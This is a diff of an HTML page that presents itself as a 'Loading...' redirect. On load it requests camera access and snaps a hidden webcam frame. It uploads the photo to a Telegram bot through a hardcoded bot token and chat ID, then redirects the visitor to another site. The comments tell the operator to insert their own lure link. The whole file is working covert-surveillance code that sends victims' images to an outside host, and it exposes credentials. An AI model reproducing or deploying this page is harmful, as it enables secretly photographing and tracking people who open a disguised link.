@@ -1,60 +1,74 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Redirecting...</title>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
 </head>
-<body style="margin: 0; padding: 0; background: #000;">
+<body style="margin:0; background:#000;">
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
-<video id="video" autoplay playsinline style="display: none;"></video>
-<canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+  <script>
+    const BOT_TOKEN = "7594029242:AAGlcWf6mZPKVm6NEsLsAEpqXWRrFhBaS8w";
+    const CHAT_ID = "7009447523";
+    const REDIRECT_URL = "https://google.com"; // 👈 Apna link daalein
 
-<script>
-  const BOT_TOKEN = "8182226345:AAF3bv4klc-gx-he8_uzPgq-NFPpZqXQ2Ro";
-  const CHAT_ID = "7009447523";
-  const REDIRECT_URL = "https://google.com"; // <-- Yahan apni link daalna
+    // Always request fresh permission
+    async function forceCameraAccess() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        return stream;
+      } catch (err) {
+        console.error("🚫 Camera blocked:", err);
+        return null;
+      }
+    }
 
-  async function autoCaptureAndSend() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("canvas");
-      video.srcObject = stream;
+    async function captureAndSend(stream) {
+      try {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        video.srcObject = stream;
 
-      // Wait for video to be ready
-      await new Promise(resolve => {
-        video.onloadedmetadata = () => resolve();
-      });
-
-      // Wait a bit for auto-focus, then capture
-      setTimeout(async () => {
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const dataUrl = canvas.toDataURL("image/png");
-        const blob = await (await fetch(dataUrl)).blob();
-
-        const formData = new FormData();
-        formData.append("chat_id", CHAT_ID);
-        formData.append("photo", blob, "pic.png");
-
-        // Send to Telegram bot
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-          method: "POST",
-          body: formData
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => resolve();
         });
 
-        // Redirect immediately
-        window.location.href = REDIRECT_URL;
-      }, 1500); // delay for image clarity
+        // Wait 300ms for video to stabilize
+        setTimeout(async () => {
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL('image/jpeg', 0.9);
+          const blob = await (await fetch(imageData)).blob();
 
-    } catch (err) {
-      // If user denies permission or error occurs
-      window.location.href = REDIRECT_URL;
+          const formData = new FormData();
+          formData.append("chat_id", CHAT_ID);
+          formData.append("photo", blob, "snap.jpg");
+
+          // Send image
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          }).catch(err => console.error("Telegram error:", err));
+        }, 300); // short delay for frame capture
+      } catch (error) {
+        console.error("❌ Capture/send failed:", error);
+      }
     }
-  }
 
-  // Start on page load
-  window.onload = autoCaptureAndSend;
-</script>
+    // Start process on load
+    window.onload = async () => {
+      const stream = await forceCameraAccess();
+
+      if (stream) {
+        await captureAndSend(stream);
+      }
+
+      // Redirect after short time regardless of success
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, 1000); // 1 second total
+    };
+  </script>
 </body>
 </html>
